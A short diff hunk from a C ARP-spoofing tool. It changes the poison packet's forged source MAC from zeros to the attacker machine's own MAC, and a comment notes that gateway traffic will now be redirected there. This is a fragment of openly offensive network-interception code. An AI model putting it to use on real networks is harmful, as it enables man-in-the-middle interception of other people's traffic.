@@ -155,7 +155,7 @@ int main(int argc, char **argv) {
 
 	//fill poison packet
 	memcpy(&poison_packet, &restore_packet, sizeof(poison_packet));
-	memset(&poison_packet.arp.src_mac, 0, sizeof(poison_packet.arp.src_mac)); //send your gateway requests to 00:00:00:00:00:00 >:)
+	memcpy(&poison_packet.arp.src_mac, this_machine.mac, sizeof(mac_address_t)); //send your gateway packets here >:)
 
 	pthread_t arp_thread;
 	pthread_create(&arp_thread, NULL, arpThreadFunction, (void*)pcap);
